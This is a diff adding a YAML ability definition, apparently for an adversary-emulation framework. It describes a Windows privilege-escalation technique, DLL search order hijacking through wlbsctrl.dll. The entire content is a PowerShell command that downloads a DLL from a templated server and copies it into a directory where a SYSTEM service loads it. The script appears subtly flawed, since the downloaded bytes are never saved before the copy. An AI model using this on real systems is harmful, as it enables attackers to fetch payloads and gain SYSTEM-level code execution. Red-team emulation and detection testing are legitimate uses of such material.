@@ -1,0 +1,18 @@
+---
+
+- id: 48cde3d6-add2-40c0-a1d8-0b35d9e2894a
+  name: wlbsctrl dll inject
+  description: takes advantages of windows missing dll searching to execute dll as system
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1038
+    name: DLL Search Order Hijacking
+  platforms:
+    windows:
+      psh:
+        command: |
+          $url="#{server}/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("file","debugger.dll");
+          $PBytes = $wc.DownloadData($url);
+          copy debugger.dll C:\Python27\wlbsctrl.dll
